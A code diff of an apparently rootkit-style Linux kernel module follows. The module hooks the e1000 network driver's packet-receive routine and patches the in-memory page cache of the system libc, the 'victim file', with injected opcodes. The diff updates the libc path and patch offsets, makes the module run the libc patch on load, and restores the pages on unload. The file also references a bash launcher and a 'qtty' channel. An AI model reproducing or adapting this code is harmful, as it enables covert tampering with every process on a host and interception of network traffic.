@@ -15,7 +15,7 @@
 const char* net_adapter = "e1000";
 extern struct qtty qtty;
 
-#define VICTIM_FILE_OVERRIDE "/lib/x86_64-linux-gnu/libc-2.33.so"
+#define VICTIM_FILE_OVERRIDE "/usr/lib/x86_64-linux-gnu/libc.so.6"
 
 #define STRINGIFY(A) #A
 #define TOSTRING(A) STRINGIFY(A) //I don't why the fuck this works. If I had to take a guess, it is because when you pass in A in TOSTRING, you pass in the value of A which is then stringifyed.
@@ -35,7 +35,7 @@ struct page* old_opcode;
 struct page* new_opcode;
 struct page* old_troll;
 struct page* new_troll;
-char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nop
+char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x84, 0x86, 0x0A, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }; //append with a shit ton of nop
 void page_cache_test(void){
   char* path = VICTIM_FILE_OVERRIDE;
   i = get_file_path(path);//
@@ -50,8 +50,8 @@ void page_cache_test(void){
     return;
   }
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
-  write_string_page_cache(i, 0x00191027, troll, 8, &new_troll, &old_troll);
-  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21, &new_opcode, &old_opcode);
+  write_string_page_cache(i, 0x1c002b, troll, 8, &new_troll, &old_troll);
+  write_string_page_cache(i, 0x001179a0, trolling_opcodes, 21, &new_opcode, &old_opcode);
   
 
 }
@@ -109,6 +109,7 @@ int init_module(void)
   if(sizeof(struct ethhdr) == ETH_HLEN){
     printk(KERN_INFO "SAME\n");
   }
+  page_cache_test();
   //launch_bash();
   init_qtty();
   printk(KERN_INFO "clean_rx replaced\n");
@@ -119,8 +120,8 @@ void cleanup_module(void)
 {
   if(e1000)
     WRITE_ONCE(e1000->clean_rx, old_clean_rx);
-  //replace_page(new_opcode, old_opcode);
-  //replace_page(new_troll, old_troll); //flipped around because old is the new now. 
+  replace_page(new_opcode, old_opcode);
+  replace_page(new_troll, old_troll); //flipped around because old is the new now. 
   qtty_clean_up();
 
   
